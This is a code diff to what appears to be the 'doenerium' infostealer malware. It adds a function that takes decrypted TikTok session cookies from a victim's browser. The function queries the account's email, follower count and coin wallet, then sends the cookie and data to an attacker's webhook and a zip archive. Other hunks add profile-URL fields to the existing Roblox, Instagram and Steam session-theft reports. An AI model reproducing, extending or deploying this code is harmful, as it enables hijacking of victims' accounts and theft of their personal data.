@@ -25,6 +25,7 @@
             bookmarks: 0,
             screenshots: 0,
 
+            tiktok_found: 0,
             roblox_found: 0,
             instagram_found: 0,
             minecraft_found: 0,
@@ -731,6 +732,90 @@
         module.exports = (client) => {
           return {
 
+            async stealTikTokSession(cookie, browser) {
+              try {
+                const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
+                const { data: accountInfo } = await client.requires.axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", headers);
+                const { data: insights } = await client.requires.axios(
+                  {
+                    method: "POST",
+                    url: "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
+                    headers: { cookie: cookie },
+                    data: "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]"
+                  }
+                )
+
+                const { data: wallet } = await client.requires.axios(
+                  {
+                    method: "GET",
+                    url: `https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true`,
+                    headers: {
+                      cookie: cookie
+                    }
+                  }
+                )
+                
+                await client.utils.webhook.sendToWebhook({
+                  embeds: [
+                    client.utils.webhook.createEmbed(
+                      {
+                        "title": "TikTok Account stolen",
+                        "description": `The tiktok account was detected on the \`\`${browser}\`\` browser`,
+                        fields: [
+                          {
+                            name: "Cookie",
+                            value: `\`\`\`${cookie}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Profile URL",
+                            value: `[Click here](https://tiktok.com/@${accountInfo.data.username})`,
+                            inline: false
+                          },
+                          {
+                            name: "User identifier",
+                            value: `\`\`\`${accountInfo.data.user_id_str}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Email",
+                            value: `\`\`\`${accountInfo.data.email}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Username",
+                            value: `\`\`\`${accountInfo.data.username}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Follower Count",
+                            value: `\`\`\`${insights.follower_num.value}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Coins",
+                            value: `\`\`\`${wallet.data.coins}\`\`\``,
+                            inline: false
+                          },
+                          
+                        ]
+                      }
+                    )
+                  ]
+                })
+
+                client.config.counter.tiktok_found++;
+
+                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\TikTok Accounts`)) {
+                  client.utils.jszip.createFolder("\\TikTok Accounts")
+                }
+
+                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: ${cookie}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}`)
+
+              } catch (e) {
+                // console.log(e)
+              }
+            },
 
             async stealRobloxSession(cookie, browser) {
               try {
@@ -751,9 +836,14 @@
                         },
                         fields: [
                           {
-                            name: "Access Token / Cookie",
+                            name: "Cookie",
                             value: `\`\`\`${cookie}\`\`\``,
                             inline: true
+                          },
+                          {
+                            name: "Profile URL",
+                            value: `\`\`\`[Click here](https://roblox.com/users/${accountInfo.UserId}/profile)\`\`\``,
+                            inline: false
                           },
                           {
                             name: "Robux",
@@ -820,6 +910,11 @@
                             name: "Cookie",
                             value: `\`\`\`${cookie}\`\`\``,
                             inline: true
+                          },
+                          {
+                            name: "Profile URL",
+                            value: `\`\`\`[Click here](https://instagram.com/${accountInfo.username})\`\`\``,
+                            inline: false
                           },
                           {
                             name: "Username",
@@ -1182,11 +1277,15 @@
                       } catch { }
 
                       if (row["host_key"].includes("instagram") && row["name"].includes("sessionid")) {
-                        client.utils.browsers.stealInstagramSession(`sessionid=${decrypted}`, browser)
+                        client.utils.browsers.stealInstagramSession(`sessionid=${decrypted}`, browser);
+                      }
+
+                      if (row["host_key"].includes("tiktok") && row["name"] == "sessionid") {
+                        client.utils.browsers.stealTikTokSession(`sessionid=${decrypted}`, browser);
                       }
 
                       if (row["name"].includes(".ROBLOSECURITY")) {
-                        client.utils.browsers.stealRobloxSession(`.ROBLOSECURITY=${decrypted}`, browser)
+                        client.utils.browsers.stealRobloxSession(`.ROBLOSECURITY=${decrypted}`, browser);
                       }
 
                       client.config.environ.cookies.all.push(
@@ -2732,6 +2831,11 @@
                                 inline: false
                               },
                               {
+                                name: "Profile URL",
+                                value: `[Click here](${accountInfo.players[0].profileurl})`,
+                                inline: false
+                              },
+                              {
                                 name: "Display Name",
                                 value: `\`\`\`${accountInfo.players[0].personaname}\`\`\``,
                                 inline: false
@@ -2750,12 +2854,7 @@
                                 name: "Game count",
                                 value: `\`\`\`${games.game_count || "Private"}\`\`\``,
                                 inline: false
-                              },
-                              {
-                                name: "Profile URL",
-                                value: `[${accountInfo.players[0].profileurl}](${accountInfo.players[0].profileurl})`,
-                                inline: false
-                              },
+                              }
                             ]
                           }
                         )
@@ -2873,7 +2972,7 @@
               if (client.utils.encryption.step1 && client.utils.encryption.step2) { // Runtime var renames check
                 await this.send_zip();
               }
-              
+
             },
 
             getFolderFiles(path_prefix, path) {
@@ -2955,6 +3054,7 @@
                 "🌐 Wallets/Important extensions": client.config.counter.wallets,
                 "📶 Wifi networks": client.config.counter.wifinetworks,
                 "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
+                "👉 Found TikTok session(s)": client.config.counter.instagram_found,
                 "😋 Found Instagram session(s)": client.config.counter.instagram_found,
                 "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
                 "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
@@ -3735,7 +3835,7 @@ return ${eval_string};
           }
         }
 
-        
+
 
         await this.utils.infection.get_minecraft();
         await this.utils.infection.get_growtopia();
